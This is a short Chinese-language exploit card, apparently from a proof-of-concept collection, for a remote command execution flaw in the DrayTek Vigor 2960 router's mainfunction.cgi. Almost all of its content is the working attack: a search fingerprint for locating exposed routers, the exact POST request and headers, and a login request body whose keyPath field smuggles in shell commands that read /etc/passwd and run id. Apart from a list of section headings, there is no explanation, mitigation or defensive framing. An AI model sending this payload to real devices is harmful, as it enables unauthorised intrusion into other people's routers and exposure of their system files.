# DraytekVigor2960路由器mainfunction远程命令执行漏洞

- **系统**：DraytekVigor2960　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="Vigor 2960"`
- **请求**：`POST /cgi-bin/mainfunction.cgi HTTP/1.1`
- **关键头**：`Content-Length: 94`　`Content-Type: text/plain; charset=UTF-8`

**请求体 / payload**
```
action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%26id%0A%27&loginUser=a&loginPwd=a
```

**其他**
- Draytek Vigor 2960 路由器mainfunction远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Draytek Vigor 2960 路由器